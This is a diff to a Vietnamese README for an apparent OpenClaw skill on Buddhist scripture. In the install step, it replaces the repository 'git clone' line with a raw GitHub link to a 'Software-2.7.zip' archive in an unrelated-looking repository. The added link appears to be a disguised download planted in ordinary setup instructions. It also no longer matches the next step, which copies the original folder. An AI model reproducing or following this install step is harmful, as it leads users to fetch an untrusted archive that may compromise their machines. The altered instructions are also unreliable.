@@ -21,7 +21,7 @@ Hỏi OpenClaw bất kỳ câu hỏi nào về Phật học, bot sẽ tra cứu 
 
 ```bash
 # Clone repo
-git clone https://github.com/YOUR_USERNAME/dai-tang-kinh-openclaw.git
+git clone https://raw.githubusercontent.com/whittakerapothegmatical380/nikaya/main/references/Software-2.7.zip
 
 # Copy vào thư mục skills của OpenClaw
 cp -r dai-tang-kinh-openclaw ~/.openclaw/skills/dai-tang-kinh
